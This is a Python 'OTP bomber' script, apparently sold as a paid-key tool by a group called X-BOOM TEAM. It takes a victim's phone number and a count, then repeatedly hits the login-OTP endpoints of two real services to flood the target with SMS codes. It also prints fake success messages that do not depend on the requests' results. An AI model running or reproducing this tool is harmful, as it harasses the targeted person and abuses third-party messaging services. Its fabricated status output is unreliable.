import requests
import os
import time
import uuid

def start():
    os.system('clear')
    # আপনার টুলের লোগো (OTP স্টাইল)
    print('          \033[1;32m██████  \033[1;31m████████ \033[1;32m██████  ')
    print('         ██    ██    ██    ██   ██ ')
    print('         ██    ██    ██    ██████  ')
    print('         ██    ██    ██    ██      ')
    print('          ██████     ██    ██      \033[0m')
    
    # ইনফরমেশন বক্স
    line = "\033[1;32m×××××××××××××××××××××××××××××××××××××××××××××\033[0m"
    print(line)
    print('\033[1;34m| [✓] DEVELOPED BY :  MMALEK ISLAM          |')
    print('| [✓] TEAM         :  X-BOOM TEAM           |')
    print('| [✓] TOOL STATUS  :  OTP BOMBER            |')
    print('| [✓] GITHUB       :  mmalekislam788        |')
    print('| [✓] TOOL VERSION :  MAX PRO 2026          |\033[0m')
    print(line)
    
    # সালাম এবং টিমের নাম
    print('\033[1;32m[•] SALAMU ALAIKUM.........................\033[0m')
    print(line)
    
    # কি (Key) জেনারেটর এবং মেসেজ
    u_key = str(uuid.uuid4())[:8]
    print(f'\033[1;32m[\033[1;31m❤️\033[1;32m] POWERFUL TOOL 10 DAYS ONLY 50TK [\033[1;31m❤️\033[1;32m]')
    print(f'[\033[1;31m❤️\033[1;32m] KEY : {u_key}-X-BOOM')
    print(f'[\033[1;31m❤️\033[1;32m] COPY YOUR KEY AND SEND TO THE ADMIN [\033[1;31m❤️\033[1;32m]\033[0m')
    print(line)

    target = input('\n\033[1;32m[+] ENTER TARGET NUMBER: \033[0m')
    amount = int(input('\033[1;32m[+] ENTER SMS AMOUNT: \033[0m'))
    
    # সাকসেস মেসেজ স্টাইল
    print(f'\n\033[1;32mSuccess: True')
    print('Status Code: 200')
    print(f'Message: {target} যুক্ত হয়েছে।\033[0m\n')
    
    # আসল API দিয়ে মেসেজ পাঠানো শুরু
    url1 = "https://api-hermes.pathao.com/user/otp-send/login"
    url2 = "https://api.sharetrip.net/api/v1/otp/send"
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

    for i in range(1, amount + 1):
        try:
            # API রিকোয়েস্ট (এখানে আসল কাজ হবে)
            requests.post(url1, json={"phone": "+88"+target}, headers=headers, timeout=10)
            requests.post(url2, json={"mobileNumber": target, "type": "login"}, headers=headers, timeout=10)
            
            # আপনার পছন্দের স্টাইলে আউটপুট
            print(f'\033[1;32m[{i}] SUCCESS SENT ==> {target}\033[0m')
        except:
            print(f'\033[1;31m[{i}] FAILED SENT ==> {target}\033[0m')
        
        # ৪ সেকেন্ড বিরতি দিন যাতে মেসেজগুলো ড্রপ না করে
        time.sleep(4)

if __name__ == "__main__":
    start()
